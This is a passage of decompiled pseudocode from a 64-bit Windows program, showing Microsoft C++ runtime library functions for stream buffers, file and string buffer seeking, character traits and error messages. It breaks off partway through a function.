__int64 __fastcall std::_Tree<std::_Tmap_traits<void *,`anonymous namespace'::_Mutex_count_pair,std::less<void *>,std::_Crt_allocator<std::pair<void * const,`anonymous namespace'::_Mutex_count_pair>>,0>>::max_size(
        __int64 a1)
{
  __int64 v2; // [rsp+20h] [rbp-18h] BYREF
  __int64 v3; // [rsp+28h] [rbp-10h] BYREF

  sub_140008610(a1);
  v2 = unknown_libname_37();
  v3 = sub_1400032D0();
  return *unknown_libname_12(&v3, &v2);
}


// ----- ?max_size@?$_Tree@V?$_Tmap_traits@PEAXU_Mutex_count_pair@?A0xd833279a@@U?$less@PEAX@std@@V?$_Crt_allocator@U?$pair@QEAXU_Mutex_count_pair@?A0xd833279a@@@std@@@4@$0A@@std@@@std@@QEBA_KXZ_0 @ 0x14000c010 -----
__int64 __fastcall std::_Tree<std::_Tmap_traits<void *,`anonymous namespace'::_Mutex_count_pair,std::less<void *>,std::_Crt_allocator<std::pair<void * const,`anonymous namespace'::_Mutex_count_pair>>,0>>::max_size(
        __int64 a1)
{
  __int64 v2; // [rsp+20h] [rbp-18h] BYREF
  __int64 v3; // [rsp+28h] [rbp-10h] BYREF

  sub_140008610(a1);
  v2 = sub_14000BE80();
  v3 = sub_1400032D0();
  return *unknown_libname_12(&v3, &v2);
}


// ----- ?message@_Iostream_error_category2@std@@UEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@H@Z @ 0x14000c060 -----
struct std::_Container_base0 *__fastcall std::_Iostream_error_category2::message(
        __int64 a1,
        struct std::_Container_base0 *a2,
        int a3)
{
  const char *v4; // rax

  if ( a3 == 1 )
  {
    sub_140004EE0(a2, (__int64)"iostream stream error", 0x15u);
  }
  else
  {
    v4 = std::_Syserror_map(a3);
    sub_140004E80(a2, (__int64)v4);
  }
  return a2;
}


// ----- ?message@error_code@std@@QEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ @ 0x14000c0f0 -----
__int64 __fastcall std::error_code::message(__crt_win32_buffer_debug_info *a1, __int64 a2)
{
  unsigned int v3; // [rsp+24h] [rbp-24h]
  const char *v4; // [rsp+28h] [rbp-20h]
  void (__fastcall *v5)(const char *, __int64, _QWORD); // [rsp+30h] [rbp-18h]

  v4 = __crt_win32_buffer_debug_info::file_name(a1);
  v5 = *(void (__fastcall **)(const char *, __int64, _QWORD))(*(_QWORD *)v4 + 16LL);
  v3 = `anonymous namespace'::_Transcode_result::_Error(a1);
  v5(v4, a2, v3);
  return a2;
}


// ----- sub_14000C160 @ 0x14000c160 -----
char *__fastcall sub_14000C160(char *a1, char *a2, size_t a3)
{
  char v4; // [rsp+20h] [rbp-28h]
  __int64 j; // [rsp+28h] [rbp-20h]
  size_t k; // [rsp+30h] [rbp-18h]
  char *i; // [rsp+38h] [rbp-10h]

  if ( sub_1400092F0() != 0 )
  {
    v4 = 1;
    for ( i = a2; i != &a2[a3]; ++i )
    {
      if ( a1 == i )
      {
        v4 = 0;
        break;
      }
    }
    if ( v4 != 0 )
    {
      for ( j = 0; j != a3; ++j )
        a1[j] = a2[j];
    }
    else
    {
      for ( k = a3; k != 0; --k )
        a1[k - 1] = a2[k - 1];
    }
    return a1;
  }
  else
  {
    memcpy(a1, a2, a3);
    return a1;
  }
}


// ----- ?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z @ 0x14000c2a0 -----
_WORD *__fastcall std::_Char_traits<wchar_t,unsigned short>::move(_WORD *a1, _WORD *a2, __int64 a3)
{
  char v4; // [rsp+20h] [rbp-28h]
  __int64 j; // [rsp+28h] [rbp-20h]
  __int64 k; // [rsp+30h] [rbp-18h]
  _WORD *i; // [rsp+38h] [rbp-10h]

  if ( sub_1400092F0() != 0 )
  {
    v4 = 1;
    for ( i = a2; i != &a2[a3]; ++i )
    {
      if ( a1 == i )
      {
        v4 = 0;
        break;
      }
    }
    if ( v4 != 0 )
    {
      for ( j = 0; j != a3; ++j )
        a1[j] = a2[j];
    }
    else
    {
      for ( k = a3; k != 0; --k )
        a1[k - 1] = a2[k - 1];
    }
    return a1;
  }
  else
  {
    memcpy(a1, a2, 2 * a3);
    return a1;
  }
}


// ----- sub_14000C3D0 @ 0x14000c3d0 -----
const char *sub_14000C3D0()
{
  return "iostream";
}


// ----- ?not_eof@?$_Narrow_char_traits@DH@std@@SAHH@Z @ 0x14000c3e0 -----
__int64 __fastcall std::_Narrow_char_traits<char,int>::not_eof(unsigned int a1)
{
  if ( a1 == (unsigned int)sub_14000B200() )
    return sub_14000B200() == 0;
  else
    return a1;
}


// ----- sub_14000C430 @ 0x14000c430 -----
_QWORD *__fastcall sub_14000C430(_QWORD *a1, __int64 a2, unsigned int a3, unsigned int a4)
{
  const struct std::locale::facet *v5; // rax
  FILE *v6; // [rsp+20h] [rbp-38h]
  std::locale *v7; // [rsp+30h] [rbp-28h]
  _BYTE v8[32]; // [rsp+38h] [rbp-20h] BYREF

  if ( a1[16] != 0 )
    return nullptr;
  v6 = (FILE *)sub_140010158(a2, a3, a4);
  if ( v6 == nullptr )
    return nullptr;
  sub_140008AF0((__int64)a1, v6, 1);
  v7 = (std::locale *)sub_14000B7B0((__int64)a1, (__int64)v8);
  v5 = sub_140004270(v7);
  sub_140009000(a1, (__int64)v5);
  sub_140006DC0((__int64)v8);
  return a1;
}


// ----- sub_14000C4F0 @ 0x14000c4f0 -----
__int64 __fastcall sub_14000C4F0(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        __int64 a4,
        __int64 a5,
        __int64 a6,
        __int64 a7,
        __int64 a8)
{
  return (*(__int64 (__fastcall **)(__int64, __int64, __int64, __int64, __int64, __int64, __int64, __int64, _QWORD))(*(_QWORD *)a1 + 56LL))(
           a1,
           a2,
           a3,
           a4,
           a5,
           a6,
           a7,
           a8,
           *(_QWORD *)(*(_QWORD *)a1 + 56LL));
}


// ----- sub_14000C570 @ 0x14000c570 -----
__int64 __fastcall sub_14000C570(__int64 a1, unsigned int a2)
{
  int v2; // eax
  char v4; // [rsp+40h] [rbp-88h]
  char v5; // [rsp+41h] [rbp-87h]
  unsigned int v6; // [rsp+44h] [rbp-84h]
  size_t ElementCount; // [rsp+50h] [rbp-78h]
  unsigned __int64 v10; // [rsp+58h] [rbp-70h]
  __int64 v11; // [rsp+60h] [rbp-68h]
  _BYTE *v12; // [rsp+78h] [rbp-50h] BYREF
  char *v13; // [rsp+80h] [rbp-48h] BYREF
  char v14; // [rsp+88h] [rbp-40h] BYREF
  _BYTE v15[7]; // [rsp+89h] [rbp-3Fh] BYREF
  _BYTE Buffer[32]; // [rsp+90h] [rbp-38h] BYREF
  _BYTE v17[8]; // [rsp+B0h] [rbp-18h] BYREF

  v2 = sub_14000B200();
  if ( std::_Narrow_char_traits<char,int>::eq_int_type(v2, a2) )
    return std::_Narrow_char_traits<char,int>::not_eof(a2);
  if ( unknown_libname_40(a1) != 0 )
  {
    v10 = unknown_libname_40(a1);
    if ( v10 < std::streambuf::epptr(a1) )
    {
      v4 = std::_Narrow_char_traits<char,int>::to_char_type(a2);
      *(_BYTE *)std::streambuf::_Pninc(a1) = v4;
      return a2;
    }
  }
  if ( *(_QWORD *)(a1 + 128) == 0 )
    return sub_14000B200();
  sub_140009660(a1);
  if ( *(_QWORD *)(a1 + 104) == 0 )
  {
    v11 = *(_QWORD *)(a1 + 128);
    v5 = std::_Narrow_char_traits<char,int>::to_char_type(a2);
    if ( std::_Fputc<char>(v5, v11) )
      return a2;
    else
      return (unsigned int)sub_14000B200();
  }
  v14 = std::_Narrow_char_traits<char,int>::to_char_type(a2);
  v6 = sub_14000C4F0(
         *(_QWORD *)(a1 + 104),
         a1 + 116,
         (__int64)&v14,
         (__int64)v15,
         (__int64)&v13,
         (__int64)Buffer,
         (__int64)v17,
         (__int64)&v12);
  if ( v6 < 2 )
  {
    if ( v12 == Buffer || (ElementCount = v12 - Buffer) == fwrite(Buffer, 1u, ElementCount, *(FILE **)(a1 + 128)) )
    {
      *(_BYTE *)(a1 + 113) = 1;
      if ( v13 != &v14 )
        return a2;
    }
    return sub_14000B200();
  }
  if ( v6 != 3 )
    return sub_14000B200();
  if ( std::_Fputc<char>(v14, *(_QWORD *)(a1 + 128)) )
    return a2;
  else
    return (unsigned int)sub_14000B200();
}


// ----- unknown_libname_39 @ 0x14000c850 -----
// Microsoft VisualC v14 64bit runtime
__int64 unknown_libname_39()
{
  return sub_14000B200();
}


// ----- sub_14000C870 @ 0x14000c870 -----
__int64 __fastcall sub_14000C870(__int64 a1, unsigned int a2)
{
  int v3; // eax
  __int64 v4; // rax
  __int64 v5; // rax
  void *v6; // rax
  char v7; // [rsp+20h] [rbp-68h]
  char v8; // [rsp+21h] [rbp-67h]
  _BYTE *v9; // [rsp+28h] [rbp-60h]
  unsigned __int64 v10; // [rsp+30h] [rbp-58h]
  unsigned __int64 v11; // [rsp+38h] [rbp-50h]
  _BYTE *v12; // [rsp+40h] [rbp-48h]
  unsigned __int64 v13; // [rsp+48h] [rbp-40h]
  __int64 v14; // [rsp+58h] [rbp-30h]
  __int64 v15; // [rsp+70h] [rbp-18h] BYREF

  if ( (*(_DWORD *)(a1 + 112) & 2) != 0 )
    return sub_14000B200();
  v3 = sub_14000B200();
  if ( std::_Narrow_char_traits<char,int>::eq_int_type(v3, a2) )
    return std::_Narrow_char_traits<char,int>::not_eof(a2);
  v11 = unknown_libname_40(a1);
  v13 = std::streambuf::epptr(a1);
  if ( v11 != 0 && v11 < v13 )
  {
    v7 = std::_Narrow_char_traits<char,int>::to_char_type(a2);
    *(_BYTE *)std::streambuf::_Pninc(a1) = v7;
    *(_QWORD *)(a1 + 104) = v11 + 1;
    return a2;
  }
  else
  {
    v10 = 0;
    v12 = (_BYTE *)unknown_libname_32(a1);
    if ( v11 != 0 )
      v10 = v13 - (_QWORD)v12;
    if ( v10 >= 0x20 )
    {
      if ( v10 >= 0x3FFFFFFF )
      {
        if ( v10 >= 0x7FFFFFFF )
          return sub_14000B200();
        v15 = 0x7FFFFFFF;
      }
      else
      {
        v15 = 2 * v10;
      }
    }
    else
    {
      v15 = 32;
    }
    v4 = std::_Allocate_at_least_helper<std::allocator<char>>(a1 + 116, &v15);
    v9 = (_BYTE *)unknown_libname_71(v4);
    sub_14000A830(v9, v12, v10);
    *(_QWORD *)(a1 + 104) = &v9[v10 + 1];
    std::streambuf::setp(a1, v9, &v9[v10], &v9[v15]);
    if ( (*(_DWORD *)(a1 + 112) & 4) != 0 )
    {
      std::streambuf::setg(a1, v9, v9, v9);
    }
    else
    {
      v14 = *(_QWORD *)(a1 + 104);
      v5 = unknown_libname_35(a1);
      std::streambuf::setg(a1, v9, &v9[v5 - (_QWORD)v12], v14);
    }
    if ( (*(_DWORD *)(a1 + 112) & 1) != 0 )
    {
      v6 = (void *)sub_14000CE30(v12);
      sub_14000AA30(a1 + 116, v6, v10);
    }
    *(_DWORD *)(a1 + 112) |= 1u;
    v8 = std::_Narrow_char_traits<char,int>::to_char_type(a2);
    *(_BYTE *)std::streambuf::_Pninc(a1) = v8;
    return a2;
  }
}


// ----- ?pbackfail@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MEAAHH@Z @ 0x14000cb80 -----
__int64 __fastcall std::filebuf::pbackfail(__int64 a1, unsigned int a2)
{
  int v2; // eax
  __int64 v3; // rax
  int v4; // eax
  int v6; // eax
  unsigned __int8 v7[8]; // [rsp+20h] [rbp-28h] BYREF
  __int64 v8; // [rsp+28h] [rbp-20h]
  FILE *v9; // [rsp+30h] [rbp-18h]

  if ( unknown_libname_35(a1) != 0
    && (v8 = unknown_libname_32(a1)) < (unsigned __int64)unknown_libname_35(a1)
    && ((v2 = sub_14000B200(), std::_Narrow_char_traits<char,int>::eq_int_type(v2, a2))
     || (v3 = unknown_libname_35(a1),
         v4 = std::_Narrow_char_traits<char,int>::to_int_type(*(unsigned __int8 *)(v3 - 1)),
         std::_Narrow_char_traits<char,int>::eq_int_type(v4, a2))) )
  {
    std::streambuf::_Gndec(a1);
    return std::_Narrow_char_traits<char,int>::not_eof(a2);
  }
  else if ( *(_QWORD *)(a1 + 128) != 0
         && (v6 = sub_14000B200(), !std::_Narrow_char_traits<char,int>::eq_int_type(v6, a2)) )
  {
    if ( *(_QWORD *)(a1 + 104) != 0
      || (v9 = *(FILE **)(a1 + 128),
          v7[0] = std::_Narrow_char_traits<char,int>::to_char_type(a2),
          !std::_Ungetc<char>(v7, v9)) )
    {
      if ( unknown_libname_35(a1) == a1 + 112 )
      {
        return sub_14000B200();
      }
      else
      {
        *(_BYTE *)(a1 + 112) = std::_Narrow_char_traits<char,int>::to_char_type(a2);
        std::filebuf::_Set_back(a1);
        return a2;
      }
    }
    else
    {
      return a2;
    }
  }
  else
  {
    return sub_14000B200();
  }
}


// ----- ?pbackfail@?$basic_stringbuf@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@MEAAHH@Z @ 0x14000ccf0 -----
__int64 __fastcall std::stringbuf::pbackfail(__int64 a1, unsigned int a2)
{
  int v2; // eax
  int v4; // eax
  char v5; // [rsp+20h] [rbp-18h]
  char v6; // [rsp+21h] [rbp-17h]
  char v7; // [rsp+22h] [rbp-16h]
  unsigned __int64 v8; // [rsp+28h] [rbp-10h]

  v8 = unknown_libname_35(a1);
  if ( v8 == 0 )
    return sub_14000B200();
  if ( v8 <= unknown_libname_32(a1) )
    return sub_14000B200();
  v2 = sub_14000B200();
  if ( !std::_Narrow_char_traits<char,int>::eq_int_type(v2, a2) )
  {
    v5 = *(_BYTE *)(v8 - 1);
    v6 = std::_Narrow_char_traits<char,int>::to_char_type(a2);
    if ( !std::_Narrow_char_traits<char,int>::eq(v6, v5) && (*(_DWORD *)(a1 + 112) & 2) != 0 )
      return sub_14000B200();
  }
  std::streambuf::gbump(a1, -1);
  v4 = sub_14000B200();
  if ( !std::_Narrow_char_traits<char,int>::eq_int_type(v4, a2) )
  {
    v7 = std::_Narrow_char_traits<char,int>::to_char_type(a2);
    *(_BYTE *)unknown_libname_35(a1) = v7;
  }
  return std::_Narrow_char_traits<char,int>::not_eof(a2);
}


// ----- ?pbump@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IEAAXH@Z @ 0x14000cde0 -----
__int64 __fastcall std::streambuf::pbump(__int64 a1, int a2)
{
  _QWORD *v2; // rcx
  __int64 result; // rax

  **(_DWORD **)(a1 + 88) -= a2;
  v2 = *(_QWORD **)(a1 + 64);
  result = *v2 + a2;
  *v2 = result;
  return result;
}


// ----- sub_14000CE30 @ 0x14000ce30 -----
__int64 __fastcall sub_14000CE30(__int64 a1)
{
  return unknown_libname_71(a1);
}


// ----- unknown_libname_40 @ 0x14000ce50 -----
// Microsoft VisualC v14 64bit runtime
__int64 __fastcall unknown_libname_40(__int64 a1)
{
  return **(_QWORD **)(a1 + 64);
}


// ----- sub_14000CE70 @ 0x14000ce70 -----
__int64 __fastcall sub_14000CE70(__int64 a1)
{
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 104LL))(a1);
}


// ----- sub_14000CE90 @ 0x14000ce90 -----
__int64 *__fastcall sub_14000CE90(__int64 *a1, unsigned __int8 a2)
{
  _BYTE v3[8]; // [rsp+20h] [rbp-28h] BYREF
  unsigned __int64 v4; // [rsp+28h] [rbp-20h]
  __int64 v5; // [rsp+30h] [rbp-18h]
  unsigned __int8 v6; // [rsp+58h] [rbp+10h] BYREF

  v6 = a2;
  v4 = a1[2];
  if ( v4 >= a1[3] )
    return sub_1400037A0(a1, 1u, v3[1], v6);
  a1[2] = v4 + 1;
  v5 = unknown_libname_21(a1);
  unknown_libname_25((_BYTE *)(v4 + v5), &v6);
  v3[0] = 0;
  return (__int64 *)unknown_libname_25((_BYTE *)(v5 + v4 + 1), v3);
}


// ----- sub_14000CF50 @ 0x14000cf50 -----
__int64 __fastcall sub_14000CF50(__int64 a1, _BYTE *a2)
{
  return sub_140002D00(a1, a2);
}


// ----- unknown_libname_41 @ 0x14000cf80 -----
// Microsoft VisualC v14 64bit runtime
__int64 __fastcall unknown_libname_41(__int64 a1)
{
  return *(_QWORD *)(a1 + 72);
}


// ----- ?line_number@__crt_win32_buffer_debug_info@@QEBAHXZ @ 0x14000cf90 -----
// Microsoft VisualC v14 64bit runtime
__int64 __fastcall __crt_win32_buffer_debug_info::line_number(__crt_win32_buffer_debug_info *this)
{
  return *((unsigned int *)this + 4);
}


// ----- sub_14000CFA0 @ 0x14000cfa0 -----
__int64 __fastcall sub_14000CFA0(__int64 *a1)
{
  __int64 v2[3]; // [rsp+20h] [rbp-18h] BYREF

  v2[0] = 0;
  return unknown_libname_9(a1, v2);
}


// ----- sub_14000CFD0 @ 0x14000cfd0 -----
unsigned __int64 __fastcall sub_14000CFD0(_QWORD *a1, unsigned __int64 a2)
{
  unsigned __int64 result; // rax
  unsigned __int64 v3; // rax
  unsigned __int64 v5; // [rsp+38h] [rbp+10h] BYREF

  v5 = a2;
  result = sub_14000A480(a1);
  if ( v5 > result )
  {
    v3 = std::_Tree<std::_Tmap_traits<void *,`anonymous namespace'::_Mutex_count_pair,std::less<void *>,std::_Crt_allocator<std::pair<void * const,`anonymous namespace'::_Mutex_count_pair>>,0>>::max_size((__int64)a1);
    if ( v5 > v3 )
      sub_14000A120();
    return sub_1400032F0(a1, &v5);
  }
  return result;
}


// ----- sub_14000D020 @ 0x14000d020 -----
__int64 __fastcall sub_14000D020(__int64 a1)
{
  unsigned __int8 *v1; // rax

  if ( unknown_libname_18(a1) <= 0 )
  {
    return (unsigned int)(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 56LL))(a1);
  }
  else
  {
    v1 = (unsigned __int8 *)std::streambuf::_Gninc(a1);
    return (unsigned int)std::_Narrow_char_traits<char,int>::to_int_type(*v1);
  }
}


// ----- sub_14000D070 @ 0x14000d070 -----
_QWORD *__fastcall sub_14000D070(__int64 a1, _QWORD *a2, __int64 a3, int a4)
{
  fpos_t Position; // [rsp+20h] [rbp-18h] BYREF

  if ( unknown_libname_35(a1) == a1 + 112 && a4 == 1 && *(_QWORD *)(a1 + 104) == 0 )
    --a3;
  if ( *(_QWORD *)(a1 + 128) != 0
    && sub_1400082D0(a1)
    && (a3 == 0 && a4 == 1 || fseeki64(*(FILE **)(a1 + 128), a3, a4) == 0)
    && fgetpos(*(FILE **)(a1 + 128), &Position) == 0 )
  {
    sub_140009660(a1);
    std::fpos<_Mbstatet>::fpos<_Mbstatet>(a2, *(_QWORD *)(a1 + 116), Position);
    return a2;
  }
  else
  {
    std::fpos<_Mbstatet>::fpos<_Mbstatet>(a2, -1);
    return a2;
  }
}


// ----- unknown_libname_43 @ 0x14000d190 -----
// Microsoft VisualC v14 64bit runtime
_QWORD *__fastcall unknown_libname_43(__int64 a1, _QWORD *a2)
{
  std::fpos<_Mbstatet>::fpos<_Mbstatet>(a2, -1);
  return a2;
}


// ----- ?seekoff@?$basic_stringbuf@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@MEAA?AV?$fpos@U_Mbstatet@@@2@_JHH@Z @ 0x14000d1d0 -----
_QWORD *__fastcall std::stringbuf::seekoff(__int64 a1, _QWORD *a2, __int64 a3, int a4, char a5)
{
  __int64 v6; // rax
  bool v7; // [rsp+20h] [rbp-58h]
  bool v8; // [rsp+21h] [rbp-57h]
  __int64 v9; // [rsp+28h] [rbp-50h]
  __int64 v10; // [rsp+40h] [rbp-38h]
  __int64 v11; // [rsp+48h] [rbp-30h]
  unsigned __int64 v12; // [rsp+50h] [rbp-28h]
  __int64 v13; // [rsp+60h] [rbp-18h]
  __int64 v17; // [rsp+90h] [rbp+18h]

  v7 = (a5 & 1) != 0 && (*(_DWORD *)(a1 + 112) & 4) != 0;
  v8 = (a5 & 2) != 0 && (*(_DWORD *)(a1 + 112) & 2) != 0;
  if ( v7 || v8 )
    goto LABEL_41;
  v11 = unknown_libname_35(a1);
  if ( (*(_DWORD *)(a1 + 112) & 2) != 0 )
    v12 = 0;
  else
    v12 = unknown_libname_40(a1);
  if ( v12 != 0 && *(_QWORD *)(a1 + 104) < v12 )
    *(_QWORD *)(a1 + 104) = v12;
  v9 = unknown_libname_32(a1);
  if ( a4 != 0 )
  {
    if ( a4 == 1 )
    {
      if ( (a5 & 3) == 3 )
        goto LABEL_41;
      if ( (a5 & 1) != 0 )
      {
        if ( v11 == 0 && v9 != 0 )
          goto LABEL_41;
        v10 = v11 - v9;
      }
      else
      {
        if ( (a5 & 2) == 0 || v12 == 0 && v9 != 0 )
          goto LABEL_41;
        v10 = v12 - v9;
      }
    }
    else
    {
      if ( a4 != 2 )
      {
LABEL_41:
        std::fpos<_Mbstatet>::fpos<_Mbstatet>(a2, -1);
        return a2;
      }
      v10 = *(_QWORD *)(a1 + 104) - v9;
    }
  }
  else
  {
    v10 = 0;
  }
  if ( v10 + a3 > (unsigned __int64)(*(_QWORD *)(a1 + 104) - v9) )
    goto LABEL_41;
  v17 = v10 + a3;
  if ( v17 != 0 && ((a5 & 1) != 0 && v11 == 0 || (a5 & 2) != 0 && v12 == 0) )
    goto LABEL_41;
  v13 = v17 + v9;
  if ( (a5 & 1) != 0 && v11 != 0 )
    std::streambuf::setg(a1, v9, v13, *(_QWORD *)(a1 + 104));
  if ( (a5 & 2) != 0 && v12 != 0 )
  {
    v6 = std::streambuf::epptr(a1);
    std::streambuf::setp(a1, v9, v13, v6);
  }
  std::fpos<_Mbstatet>::fpos<_Mbstatet>(a2, v17);
  return a2;
}


// ----- sub_14000D570 @ 0x14000d570 -----
_QWORD *__fastcall sub_14000D570(__int64 a1, _QWORD *a2, _QWORD *a3)
{
  _BYTE v4[8]; // [rsp+20h] [rbp-28h] BYREF
  fpos_t Position; // [rsp+28h] [rbp-20h] BYREF

  Position = std::fpos<_Mbstatet>::operator __int64(a3);
  if ( *(_QWORD *)(a1 + 128) != 0 && sub_1400082D0(a1) && fsetpos(*(FILE **)(a1 + 128), &Position) == 0 )
  {
    *(_QWORD *)(a1 + 116) = *(_QWORD *)std::fpos<_Mbstatet>::state(a3, v4);
    sub_140009660(a1);
    std::fpos<_Mbstatet>::fpos<_Mbstatet>(a2, *(_QWORD *)(a1 + 116), Position);
    return a2;
  }
  else
  {
    std::fpos<_Mbstatet>::fpos<_Mbstatet>(a2, -1);
    return a2;
  }
}


// ----- ?seekpos@?$basic_stringbuf@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@MEAA?AV?$fpos@U_Mbstatet@@@2@V32@H@Z @ 0x14000d650 -----
_QWORD *__fastcall std::stringbuf::seekpos(__int64 a1, _QWORD *a2, _QWORD *a3, char a4)
{
  __int64 v5; // rax
  bool v6; // [rsp+20h] [rbp-48h]
  bool v7; // [rsp+21h] [rbp-47h]
  __int64 v8; // [rsp+30h] [rbp-38h]
  unsigned __int64 v9; // [rsp+38h] [rbp-30h]
  unsigned __int64 v10; // [rsp+40h] [rbp-28h]
  __int64 v11; // [rsp+48h] [rbp-20h]
  unsigned __int64 v12; // [rsp+50h] [rbp-18h]

  v6 = (a4 & 1) != 0 && (*(_DWORD *)(a1 + 112) & 4) != 0;
  v7 = (a4 & 2) != 0 && (*(_DWORD *)(a1 + 112) & 2) != 0;
  if ( v6 || v7 )
    goto LABEL_19;
  v9 = std::fpos<_Mbstatet>::operator __int64(a3);
  v11 = unknown_libname_35(a1);
  if ( (*(_DWORD *)(a1 + 112) & 2) != 0 )
    v10 = 0;
  else
    v10 = unknown_libname_40(a1);
  if ( v10 != 0 && *(_QWORD *)(a1 + 104) < v10 )
    *(_QWORD *)(a1 + 104) = v10;
  v8 = unknown_libname_32(a1);
  if ( v9 > *(_QWORD *)(a1 + 104) - v8 || v9 != 0 && ((a4 & 1) != 0 && v11 == 0 || (a4 & 2) != 0 && v10 == 0) )
  {
LABEL_19:
    std::fpos<_Mbstatet>::fpos<_Mbstatet>(a2, -1);
    return a2;
  }
  else
  {
    v12 = v9 + v8;
    if ( (a4 & 1) != 0 && v11 != 0 )
      std::streambuf::setg(a1, v8, v12, *(_QWORD *)(a1 + 104));
    if ( (a4 & 2) != 0 && v10 != 0 )
    {
      v5 = std::streambuf::epptr(a1);
      std::streambuf::setp(a1, v8, v12, v5);
    }
    std::fpos<_Mbstatet>::fpos<_Mbstatet>(a2, v9);
    return a2;
  }
}


// ----- unknown_libname_44 @ 0x14000d8b0 -----
// Microsoft VisualC v14 64bit runtime
__int64 __fastcall unknown_libname_44(__int64 a1)
{
  return a1;
}


// ----- ?setbuf@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MEAAPEAV?$basic_streambuf@DU?$char_traits@D@std@@@2@PEAD_J@Z @ 0x14000d8c0 -----
__int64 __fastcall std::filebuf::setbuf(__int64 a1, char *a2, size_t a3)
{
  int Mode; // [rsp+20h] [rbp-18h]

  if ( a2 != nullptr || a3 != 0 )
    Mode = 0;
  else
    Mode = 4;
  if ( *(_QWORD *)(a1 + 128) == 0 || setvbuf(*(FILE **)(a1 + 128), a2, Mode, a3) != 0 )
    return 0;
  sub_140008AF0(a1, *(FILE **)(a1 + 128), 1);
  return a1;
}


// ----- ?setg@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IEAAXPEAD00@Z @ 0x14000d960 -----
__int64 __fastcall std::streambuf::setg(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  **(_QWORD **)(a1 + 24) = a2;
  **(_QWORD **)(a1 + 56) = a3;
  **(_DWORD **)(a1 + 80) = a4 - a3;
  return a4 - a3;
}


// ----- ?setp@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IEAAXPEAD00@Z @ 0x14000d9c0 -----
__int64 __fastcall std::streambuf::setp(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  **(_QWORD **)(a1 + 32) = a2;
  **(_QWORD **)(a1 + 64) = a3;
  **(_DWORD **)(a1 + 88) = a4 - a3;
  return a4 - a3;
}


// ----- ?setp@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IEAAXPEAD0@Z @ 0x14000da20 -----
__int64 __fastcall std::streambuf::setp(__int64 a1, __int64 a2, __int64 a3)
{
  **(_QWORD **)(a1 + 32) = a2;
  **(_QWORD **)(a1 + 64) = a2;
  **(_DWORD **)(a1 + 88) = a3 - a2;
  return a3 - a2;
}


// ----- sub_14000DA70 @ 0x14000da70 -----
__int64 __fastcall sub_14000DA70(__crt_win32_buffer_debug_info *a1, int a2, unsigned __int8 a3)
{
  unsigned int v3; // eax

  v3 = __crt_win32_buffer_debug_info::line_number(a1);
  return sub_14000A550((__int64)a1, a2 | v3, a3);
}


// ----- sub_14000DAB0 @ 0x14000dab0 -----
__int64 __fastcall sub_14000DAB0(__int64 a1)
{
  unsigned __int8 *v1; // rax

  if ( unknown_libname_18(a1) <= 0 )
  {
    return (unsigned int)(*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 48LL))(a1);
  }
  else
  {
    v1 = (unsigned __int8 *)unknown_libname_35(a1);
    return (unsigned int)std::_Narrow_char_traits<char,int>::to_int_type(*v1);
  }
}


// ----- unknown_libname_78 @ 0x14000db00 -----
// Microsoft VisualC v14 64bit runtime
// Microsoft VisualC 64bit universal runtime
__int64 unknown_libname_78()
{
  return 0;
}


// ----- sub_14000DB10 @ 0x14000db10 -----
__int64 __fastcall sub_14000DB10(_QWORD *a1)
{
  return (__int64)(a1[1] - *a1) >> 2;
}


// ----- sub_14000DB30 @ 0x14000db30 -----
__int64 __fastcall sub_14000DB30(_QWORD *a1)
{
  return a1[1] - *a1;
}


// ----- sub_14000DB60 @ 0x14000db60 -----
__int64 __fastcall sub_14000DB60(__int64 a1)
{
  unsigned __int8 *v1; // rax
  int v5; // [rsp+28h] [rbp-10h]
  int v6; // [rsp+2Ch] [rbp-Ch]

  if ( unknown_libname_18(a1) <= 1 )
  {
    v5 = sub_14000D020(a1);
    v6 = sub_14000B200();
    if ( std::_Narrow_char_traits<char,int>::eq_int_type(v6, v5) )
      return (unsigned int)sub_14000B200();
    else
      return (unsigned int)sub_14000DAB0(a1);
  }
  else
  {
    v1 = (unsigned __int8 *)sub_140008A80(a1);
    return (unsigned int)std::_Narrow_char_traits<char,int>::to_int_type(*v1);
  }
}


// ----- sub_14000DBF0 @ 0x14000dbf0 -----
__int64 __fastcall sub_14000DBF0(__int64 a1, __int64 a2, __int64 a3)
{
  return (*(__int64 (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)a1 + 72LL))(a1, a2, a3);
}


// ----- ?state@?$fpos@U_Mbstatet@@@std@@QEBA?AU_Mbstatet@@XZ @ 0x14000dc30 -----
_QWORD *__fastcall std::fpos<_Mbstatet>::state(__int64 a1, _QWORD *a2)
{
  *a2 = *(_QWORD *)(a1 + 16);
  return a2;
}


// ----- sub_14000DC60 @ 0x14000dc60 -----
__int64 __fastcall sub_14000DC60(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  _BYTE v5[4]; // [rsp+30h] [rbp-18h] BYREF
  int v6; // [rsp+34h] [rbp-14h]

  v6 = 0;
  unknown_libname_71((__int64)v5);
  sub_1400050A0(a2, a1, a3, a4);
  return a2;
}


// ----- sub_14000DCC0 @ 0x14000dcc0 -----
__int64 __fastcall sub_14000DCC0(FILE **a1)
{
  unsigned int v2; // [rsp+20h] [rbp-28h]
  int v3; // [rsp+24h] [rbp-24h]
  int v4; // [rsp+28h] [rbp-20h]
  __int64 (__fastcall *v5)(FILE **, _QWORD); // [rsp+30h] [rbp-18h]

  if ( a1[16] != nullptr
    && (v5 = *(__int64 (__fastcall **)(FILE **, _QWORD))&(*a1)->_flag,
        v2 = sub_14000B200(),
        v3 = v5(a1, v2),
        v4 = sub_14000B200(),
        !std::_Narrow_char_traits<char,int>::eq_int_type(v4, v3))
    && fflush(a1[16]) < 0 )
  {
